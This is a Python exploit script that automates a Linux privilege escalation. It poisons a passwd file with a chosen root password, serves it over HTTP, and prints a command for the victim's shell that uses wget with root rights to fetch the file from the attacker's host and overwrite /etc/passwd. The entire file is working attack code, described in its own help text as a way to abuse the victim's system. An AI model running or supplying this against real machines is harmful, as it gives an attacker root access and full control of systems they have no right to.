#!/usr/bin/env python3
import crypt
import argparse
import tempfile
import os
import netifaces
import ipaddress
import http.server
import socketserver
import socket
from rich.console import Console
from rich.table import Table

console = Console()
parser = argparse.ArgumentParser(
        description="Poison the victims /etc/passwd file and host it over HTTP. Overwrite the /etc/passwd file of the victim by abusing the SUID bit of the wget binary.",
        usage="sudo wget_exploit.py [-h] [--file FILE] [--interface INTERFACE] [--port PORT] [--password PASSWORD]"

)

parser.add_argument(
        "--file", 
        "-f",
        type=str,
        default="./passwd",
        help="passwd file to poison"
)

parser.add_argument(
    "--interface",
    "-i",
    default="eth0",
    help="network interface or IP address to host the HTTP server (default: eth0)",
)

parser.add_argument(
    "--port",
    "-p",
    type=int,
    default="8000",
    help="port to serve the HTTP server (default: 8000)",
)

parser.add_argument(
    "--password",
    "-P",
    type=str,
    default="root",
    help="password to set for the root user (default: root)"
)

def creds_table(password:str) -> Table:
    # Print the credentials in a table
    table = Table()
    table.add_column("Login")
    table.add_column("Password")
    table.add_row("root", password)
    
    return table
def write_passwd(file:str, password:str) -> None:
    # Poison passwd file
    if os.geteuid() != 0:
        console.print("[red][!][/red] [bold]root privileges[/bold] are required to execute this script.")
        exit()
    try:
        with open(file, "r") as f:
            contents = f.readlines()
        for index, line in enumerate(contents):
            if line.startswith("root"):
                line = line.split(":")
                line[1] = crypt.crypt(password)
                contents[index] = ":".join(line)
        with open(file, "w") as f:
            f.writelines(contents)
    except FileNotFoundError:
        console.print(f"[red][!][/red] No such file: {file}")
        exit()

def check_interface(i:str) -> str:
    # Validate interface name
    try:
        host = ipaddress.IPv4Address(i)
    except ipaddress.AddressValueError:
        try:
            host = netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr']
        except ValueError:
            console.print("[red][!][/red] Error detering HTTP hosting address. Did you provide an [underline]interface[/underline] or [underline]ip[/underline]?")
    return host

def tmp_file() -> str:
    # Create a temporary HTTP server location
    serve_path = os.path.join(os.path.join(tempfile._get_default_tempdir(),next(tempfile._get_candidate_names())), "www")
    os.makedirs(serve_path)
    
    return serve_path

class TCPServer(socketserver.TCPServer):
    # Reuseable TCP server
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(self.server_address)

class Handler(http.server.SimpleHTTPRequestHandler):
    # Custom HTTP handler
    def __init__(self, *args, directory=tmp_file() ,**kwargs):
        super().__init__(*args, **kwargs)
    def log_message(self, format, *func_args):
        super().log_message(format, *func_args)

    def log_request(self, format, *func_args):
        super().log_request(format, *func_args)

def main(args) -> None:    
    try:    
        serve_host = check_interface(args.interface)

        def serve_http():
            # Serve the HTTP server
           with TCPServer((serve_host, args.port), Handler) as httpd:
                httpd.serve_forever()

        # Overwrite the passwd file
        write_passwd(args.file, args.password)

        console.print(f"[green][+][/green] Poisoned [bold]{args.file}[/bold].")
        console.print(f"[green][TIP][/green] Execute the following command on the victims shell:\n sudo wget http://{serve_host}:{args.port}/{args.file} -O /etc/passwd")
        console.print(creds_table(args.password))
        console.print(f"[green][+][/green] Serving [bold]poisoned passwd[/bold] file on [green]:{args.port}[/green]")
        try:
            serve_http()
        except KeyboardInterrupt:
            console.print("[red][!][/red] Keyboard interrupt. Exiting...")
            exit()
    except Exception as e:
        console.print(f"[red][!][/red] {e}")
        exit()

if __name__ == "__main__":
    main(parser.parse_args())
